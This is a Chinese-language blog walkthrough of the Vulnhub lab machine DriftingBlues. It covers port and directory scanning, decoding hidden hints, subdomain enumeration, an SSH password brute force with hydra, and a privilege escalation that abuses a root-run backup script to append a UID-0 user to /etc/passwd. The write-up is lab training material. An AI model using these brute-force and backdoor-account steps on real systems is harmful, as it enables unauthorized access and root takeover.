<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="VarKai"><title>DriftingBlues ｜ 平安喜乐</title>
<meta name=description content="Vulnhub靶机"><meta name=keywords content="Hugo,Blog,echo"><link rel="shortcut icon" href=https://linksecho.github.io/images/favicon.ico><link rel=stylesheet type=text/css media=screen href=https://linksecho.github.iocss/normalize.css><link rel=stylesheet type=text/css media=screen href=https://cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css><link rel=stylesheet type=text/css media=screen href=https://linksecho.github.io/css/zozo.css><link rel=stylesheet type=text/css media=screen href=https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css><link rel=stylesheet type=text/css media=screen href=https://linksecho.github.io/css/highlight.css></head><body><div class="main animate__animated animate__fadeInDown"><div class="nav_container animated fadeInDown"><div class=site_nav id=site_nav><ul><li><a href=/>首页</a></li><li><a href=/posts/>归档</a></li><li><a href=/tags/>标签</a></li><li><a href=/about/>关于</a></li></ul></div><div class=menu_icon><a id=menu_icon><i class=ri-menu-line></i></a></div></div><div class="header animated fadeInDown"><div class=site_title_container><div class=site_title><h1><a href=https://linksecho.github.io><span>平安喜乐</span></a></h1></div><div class=description><p class=sub_title>welcome to echo</p><div class=my_socials><a href=%20 title=facebook target=_blank><i class=ri-facebook-fill></i></a>
<a href=%20 title=github target=_blank><i class=ri-github-fill></i></a>
<a href=%20 title=instagram target=_blank><i class=ri-instagram-fill></i></a>
<a href=%20 title=twitter target=_blank><i class=ri-twitter-fill></i></a>
<a href=%20 title=weibo target=_blank><i class=ri-weibo-fill></i></a>
<a href=https://linksecho.github.io/index.xml type=application/rss+xml title=rss target=_blank><i class=ri-rss-fill></i></a></div></div></div></div><div class=content><div class=post_page><div class="post animate__animated animate__fadeInDown"><div class="post_title post_detail_title"><h2><a href=/posts/%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/driftingblues/>DriftingBlues</a></h2><span class=date>2023.09.26</span></div><div class="post_content markdown"><p><code>nmap 10.9.23.0/24</code> 扫描当前网段，确认靶机 IP：10.9.75.215
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240113165133.png alt=image.png></p><p>详细扫描</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# nmap -sV -p- 10.9.23.215
</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2024-01-13 16:53 CST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> bogon <span class=o>(</span>10.9.23.215<span class=o>)</span>
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.010s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65533</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.18 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl>MAC Address: 08:00:27:1F:2A:48 <span class=o>(</span>Oracle VirtualBox virtual NIC<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 32.62 seconds
</span></span></code></pre></div><p>dirb探测隐藏目录</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# dirb http://10.9.23.215 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-----------------
</span></span><span class=line><span class=cl>DIRB v2.22    
</span></span><span class=line><span class=cl>By The Dark Raver
</span></span><span class=line><span class=cl>-----------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>START_TIME: Sat Jan <span class=m>13</span> 16:53:32 <span class=m>2024</span>
</span></span><span class=line><span class=cl>URL_BASE: http://10.9.23.215/
</span></span><span class=line><span class=cl>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-----------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>GENERATED WORDS: <span class=m>4612</span>                                                          
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>---- Scanning URL: http://10.9.23.215/ ----
</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.9.23.215/css/                                                                                          
</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.9.23.215/img/                                                                                          
</span></span><span class=line><span class=cl>+ http://10.9.23.215/index.html <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:7710<span class=o>)</span>                                                                            
</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.9.23.215/js/                                                                                           
</span></span><span class=line><span class=cl>+ http://10.9.23.215/server-status <span class=o>(</span>CODE:403<span class=p>|</span>SIZE:276<span class=o>)</span>                           
</span></span><span class=line><span class=cl>---- Entering directory: http://10.9.23.215/css/ ----
</span></span><span class=line><span class=cl><span class=o>(</span>!<span class=o>)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
</span></span><span class=line><span class=cl>    <span class=o>(</span>Use mode <span class=s1>&#39;-w&#39;</span> <span class=k>if</span> you want to scan it anyway<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>---- Entering directory: http://10.9.23.215/img/ ----
</span></span><span class=line><span class=cl><span class=o>(</span>!<span class=o>)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
</span></span><span class=line><span class=cl>    <span class=o>(</span>Use mode <span class=s1>&#39;-w&#39;</span> <span class=k>if</span> you want to scan it anyway<span class=o>)</span>                                                     
</span></span><span class=line><span class=cl>---- Entering directory: http://10.9.23.215/js/ ----
</span></span><span class=line><span class=cl><span class=o>(</span>!<span class=o>)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
</span></span><span class=line><span class=cl>    <span class=o>(</span>Use mode <span class=s1>&#39;-w&#39;</span> <span class=k>if</span> you want to scan it anyway<span class=o>)</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>-----------------
</span></span><span class=line><span class=cl>END_TIME: Sat Jan <span class=m>13</span> 16:53:55 <span class=m>2024</span>
</span></span><span class=line><span class=cl>DOWNLOADED: <span class=m>4612</span> - FOUND: <span class=m>2</span>
</span></span></code></pre></div><p>gobuster，探测隐藏目录</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# gobuster dir -u http://10.9.23.215 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.sh
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.6
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.9.23.215
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.6
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Extensions:              php,html,txt,sh
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/index.html           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 7710<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 276<span class=o>]</span>
</span></span><span class=line><span class=cl>/img                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 308<span class=o>]</span> <span class=o>[</span>--&gt; http://10.9.23.215/img/<span class=o>]</span>
</span></span><span class=line><span class=cl>/css                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 308<span class=o>]</span> <span class=o>[</span>--&gt; http://10.9.23.215/css/<span class=o>]</span>
</span></span><span class=line><span class=cl>/js                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 307<span class=o>]</span> <span class=o>[</span>--&gt; http://10.9.23.215/js/<span class=o>]</span>
</span></span><span class=line><span class=cl>/secret.html          <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 25<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 276<span class=o>]</span>
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 276<span class=o>]</span>
</span></span><span class=line><span class=cl>Progress: <span class=m>1102800</span> / <span class=m>1102805</span> <span class=o>(</span>100.00%<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>      
</span></span></code></pre></div><p>首页F12找到信息
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240113170818.png alt=image.png></p><p>使用base64解密一下，得到信息
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240113170905.png alt=image.png></p><p>尝试在IP网址后加上访问，发现是使用ook混淆加密的密文
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240113170938.png alt=image.png></p><p>在<a href=https://www.splitbrain.org/services/ook>解密网站</a>解密一下，提示我们使用host文件访问，并出现了eric
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240113171051.png alt=image.png></p><p>结合首页频繁出现的信息
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240113171425.png alt=image.png></p><p>在<code>vim /etc/host</code>文件中添加解析
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240113171748.png alt=image.png></p><p>添加好后即可访问成功
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240113172023.png alt=image.png></p><p>这里我们再尝试使用gobuster进行目录爆破
使用gobuster进行本地域名爆破,这里如果出现错误无法扫描成功的话，重启一下靶机，再把刚刚填写上的数据删掉，再填写一次，最后再次尝试即可解决问题<code>gobuster host -u driftingblues.box -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</code></p><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114143110.png alt=image.png></p><p>将test.driftingblues.box再写入host
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114143144.png alt=image.png></p><p>dirb 进行 web 目录扫描
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114163342.png alt=image.png></p><p>访问 robots.txt 页面
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114163400.png alt=image.png></p><p>再访问 / ssh_cred.txt，得到下面内容</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>we can use ssh password in case of emergency. it was &#34;1mw4ckyyucky&#34;.
</span></span><span class=line><span class=cl>​
</span></span><span class=line><span class=cl>sheryl once told me that she added a number to the end of the password.
</span></span><span class=line><span class=cl>​
</span></span><span class=line><span class=cl>-db
</span></span></code></pre></div><p>使用 hydra 进行 ssh 暴力破解</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>hydra -l eric -P pass.txt 192.168.132.158 ssh
</span></span></code></pre></div><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114163623.png alt=image.png></p><p>这里我们尝试使用SSH远程登录
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114163247.png alt=image.png></p><p>找到第一个Flag
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114163654.png alt=image.png></p><p><strong>提权</strong></p><p>在<code>/var/backups</code> 目录下发现了一个<code>backup.sh</code>文件，查看该文件发现所属用户和组属性都为root权限
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114165010.png alt=image.png></p><p>查看该文件
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114165212.png alt=image.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-mysql data-lang=mysql><span class=line><span class=cl><span class=err>这个脚本看起来是一个简单的备份脚本，它使用</span><span class=w> </span><span class=o>`</span><span class=n>zip</span><span class=o>`</span><span class=w> </span><span class=err>命令将</span><span class=w> </span><span class=o>`/</span><span class=n>var</span><span class=o>/</span><span class=n>www</span><span class=o>/`</span><span class=w> </span><span class=err>目录下的内容打包成一个压缩文件</span><span class=w> </span><span class=o>`/</span><span class=n>tmp</span><span class=o>/</span><span class=n>backup</span><span class=p>.</span><span class=n>zip</span><span class=o>`</span><span class=err>。然后，它尝试使用</span><span class=w> </span><span class=o>`/</span><span class=n>bin</span><span class=o>/</span><span class=n>chmod</span><span class=o>`</span><span class=w> </span><span class=err>命令，但是缺少参数，因此这行命令可能有错误。</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>另外，脚本的最后一行</span><span class=w> </span><span class=o>`</span><span class=n>sudo</span><span class=w> </span><span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>emergency</span><span class=o>`</span><span class=w> </span><span class=err>表明它在</span><span class=w> </span><span class=o>`/</span><span class=n>tmp</span><span class=o>/`</span><span class=w> </span><span class=err>目录下执行了一个名为</span><span class=w> </span><span class=o>`</span><span class=n>emergency</span><span class=o>`</span><span class=w> </span><span class=err>的文件，并且可以用</span><span class=w> </span><span class=n>sudo</span><span class=w> </span><span class=err>去执行这个文件。</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>因此这里我们可以在这个文件中写入</span><span class=w> </span><span class=o>`</span><span class=n>echo</span><span class=w> </span><span class=s2>&#34;jack:IGhvWxGrSeLnU:0:0::/root:/bin/bash&#34;</span><span class=o>&gt;&gt;/</span><span class=n>etc</span><span class=o>/</span><span class=n>passwd</span><span class=o>`</span><span class=err>这条命令，向</span><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>passwd</span><span class=w> </span><span class=err>文件中写入超级用户以提权（密码为</span><span class=n>jack</span><span class=err>）</span><span class=w>
</span></span></span></code></pre></div><p>这里我们使用vi编辑器创建 emergency 文件，并写入创建用户命令
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114171316.png alt=image.png>
创建写入成功后，<code>chmod +x emergency</code> 赋予其可执行权限</p><p>接下来可以使用 <a href=https://www.4hou.com/posts/JNKD>pspy</a> 来监听<code>backup.sh</code>进程，监听可知该进程是一个自动执行的进程</p><p>可以看到<code>backup.sh</code>文件已经帮我们写入成功了
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114171958.png alt=image.png></p><p>切换到jack用户，现在已经提权成功了
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114172121.png alt=image.png></p><p>夺旗 flag2
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240114172521.png alt=image.png></p><hr><p>参考博客：<a href=https://szczecin.github.io/2022/06/06/Driftingblues-1/>https://szczecin.github.io/2022/06/06/Driftingblues-1/</a></p></div><div class=post_footer><div class=meta><div class=info><span class="field tags"><i class=ri-stack-line></i>
<a href=https://linksecho.github.io/tags/vulnhub/>Vulnhub</a></span></div></div></div></div><div class=doc_comments></div></div></div></div><a id=back_to_top href=# class=back_to_top><i class=ri-arrow-up-s-line></i></a><footer class=footer><div class=powered_by><a href=https://varkai.com>Designed by VarKai,</a>
<a href=http://www.gohugo.io/>Proudly published with Hugo</a></div><div class=footer_slogan><span>循此苦旅，以达星辰</span></div></footer><script src=https://linksecho.github.io/js/jquery-3.5.1.min.js></script><link href=https://linksecho.github.io/css/fancybox.min.css rel=stylesheet><script src=https://linksecho.github.io/js/fancybox.min.js></script><script src=https://linksecho.github.io/js/zozo.js></script><script type=text/javascript async src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML">MathJax.Hub.Config({tex2jax:{inlineMath:[["$","$"],["\\(","\\)"]],displayMath:[["$$","$$"],["[[","]]"]],processEscapes:!0,processEnvironments:!0,skipTags:["script","noscript","style","textarea","pre"],TeX:{equationNumbers:{autoNumber:"AMS"},extensions:["AMSmath.js","AMSsymbols.js"]}}}),MathJax.Hub.Queue(function(){var e,t=MathJax.Hub.getAllJax();for(e=0;e<t.length;e+=1)t[e].SourceElement().parentNode.className+=" has-jax"})</script><style>code.has-jax{font:inherit;font-size:100%;background:inherit;border:inherit;color:#515151}</style></body></html>